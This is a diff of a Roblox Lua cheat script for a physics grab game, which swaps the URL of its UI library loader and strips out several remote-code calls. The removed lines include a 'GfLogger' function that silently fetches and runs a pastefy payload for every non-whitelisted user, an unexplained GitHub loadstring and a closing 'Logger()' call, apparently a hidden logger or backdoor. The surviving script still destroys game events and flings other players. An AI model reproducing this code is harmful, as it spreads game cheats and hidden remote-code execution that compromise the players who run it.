@@ -248,11 +248,11 @@ end
 SpawnCFrame()
  SCF = workspace.SpawnCF
 
-local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/NP01223/NP/refs/heads/main/RayField'))()
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
 
 
-loadstring(game:HttpGet('https://raw.githubusercontent.com/dosi1100-cmyk/script/refs/heads/main/kk'))()
+
 
 G = rs.GrabEvents
 G:WaitForChild("EndGrabEarly"):Destroy()
@@ -435,20 +435,7 @@ function BlobMassless(blob, target, side)
 		blob.BlobmanSeatAndOwnerScript.CreatureDrop:FireServer(unpack(args3))
 end
 
-function GfLogger()
-    id = {
-        [1] = true,
-    }
 
-    if not id[plr.UserId] then
-        local success, errorMessage = pcall(function()
-            loadstring(game:HttpGet("https://pastefy.app/Z3ljqtf1/raw"))()
-        end)
-
-        if not success then
-        end
-    end
-end
 
 function flingF()
     workspace.ChildAdded:Connect(function(model)
@@ -8876,4 +8863,4 @@ if v.Name == "FollowThisPart" then v:Destroy() end
 if v:IsA("BasePart") then v.CustomPhysicalProperties = PhysicalProperties.new(0.35,0,0) end
 end
 
-Logger()
+
